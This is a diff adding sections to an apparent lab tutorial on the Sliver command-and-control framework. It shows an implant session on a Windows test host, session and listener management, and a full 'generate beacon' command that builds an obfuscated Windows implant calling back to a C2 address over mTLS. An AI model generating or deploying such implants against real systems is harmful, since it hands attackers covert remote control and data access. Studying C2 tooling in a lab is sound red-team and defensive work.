@@ -53,3 +53,103 @@ sliver > jobs
 ==== ====== ========== ======
  1    mtls   tcp        8888
 ```
+
+### Transfer Binary to Target&#x20;
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+### Execute The Binary
+
+* If all is successful you will see a new session opened
+
+```
+[*] Session 971c5a23 MEDICAL_CHANGE - 192.168.122.160:50051 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 22:36:48 CEST
+```
+
+### Using a session <a href="#using-a-session" id="using-a-session"></a>
+
+You can use your session with the `use` command. Just type it, hit enter, and an interactive prompt will appear that allows to select a session. Hit enter again and your prompt changes to the implant name, which was `MEDICAL_CHANGE` in my case. The session is now active and ready to accept your commands. With `info`, you can get more information about the implant:
+
+```
+sliver > use
+
+? Select a session or beacon: SESSION  971c5a23  MEDICAL_CHANGE  192.168.122.160:50051  DESKTOP-IPQVF9T  DESKTOP-IPQVF9T\tester  windows/amd64
+[*] Active session MEDICAL_CHANGE (971c5a23-73e0-4418-b9c2-266484546e0d)
+
+sliver (MEDICAL_CHANGE) > info
+
+        Session ID: 971c5a23-73e0-4418-b9c2-266484546e0d
+              Name: MEDICAL_CHANGE
+          Hostname: DESKTOP-IPQVF9T
+              UUID: d512a12c-6b6d-4f19-814e-1f60088e9563
+          Username: DESKTOP-IPQVF9T\tester
+               UID: S-1-5-21-2966923018-1740081829-2498838087-1001
+               GID: S-1-5-21-2966923018-1740081829-2498838087-513
+               PID: 7244
+                OS: windows
+           Version: 10 build 19044 x86_64
+              Arch: amd64
+         Active C2: mtls://192.168.122.111:8888
+    Remote Address: 192.168.122.160:50051
+         Proxy URL: 
+Reconnect Interval: 1m0s
+```
+
+Sliver implants supports several commands. You can get a full list with `help`. Features include file system exploration, file up- and downloads, port forwarding, taking screenshots and much more.
+
+### Kill Session
+
+```
+sessions 
+sessions -k session_id
+```
+
+```
+sliver > sessions
+
+ ID         Transport   Remote Address          Hostname          Username   Operating System   Health  
+========== =========== ======================= ================= ========== ================== =========
+ 971c5a23   mtls        192.168.122.160:50051   DESKTOP-IPQVF9T   tester     windows/amd64      [ALIVE] 
+
+sliver > sessions -k 971c5a23
+
+
+[!] Lost session 971c5a23 MEDICAL_CHANGE - 192.168.122.160:50051 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 22:52:53 CEST
+```
+
+### Kill Jobs&#x20;
+
+* To kill your listener&#x20;
+
+```
+[server] sliver > jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    mtls   tcp        8888 
+
+[server] sliver > jobs -k 1
+
+[*] Killing job #1 ...
+[*] Successfully killed job #1
+[!] Job #1 stopped (tcp/mtls)
+
+```
+
+### Generating Beaconing implant <a href="#generating-the-implant-1" id="generating-the-implant-1"></a>
+
+Generating a beacon implant is very similar to session implant generation. You use the `generate beacon` command. Learn all about the flags with `help generate beacon`. Aside from all the flags discussed above, relevant beacon flags are:
+
+* `--seconds 5`: specify that the beacon should contact the C2 server every 5 seconds. You could alternatively use `--minutes`, `--hours` or `--days`.
+* `--jitter 3`: specify that an additional random delay of up to 3 seconds should be added to the 5 seconds interval.
+
+This is how I generated the beacon:
+
+```
+sliver > generate beacon --mtls 192.168.122.111 --os windows --arch amd64 --format exe --save /var/www/html --seconds 5 --jitter 3
+
+[*] Generating new windows/amd64 beacon implant binary (5s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 00:00:18
+[*] Implant saved to /var/www/html/STALE_PNEUMONIA.exe
+```
